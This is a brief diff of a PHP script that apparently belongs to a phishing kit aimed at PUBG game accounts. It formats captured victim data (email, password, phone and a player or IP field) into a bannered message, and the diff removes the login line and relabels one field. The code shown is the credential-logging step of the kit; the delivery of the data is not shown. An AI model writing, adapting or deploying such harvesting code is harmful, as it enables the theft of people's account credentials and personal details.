@@ -98,10 +98,10 @@ if ($email == "" && $password == "" && $phone == "" && $playid == "" && $login =
 
     $msg = ("
 [+]=========== ACC PUBG ===========[+]
-[Login] = " . $login . "
+
 [Email]  = " . $email . "
 [Pass]  = " . $password . "
-[Id] = " . $playid . "
+[Ip] = " . $playid . "
 [phone] = " . $phone . "
 
 [+]============System============[+]
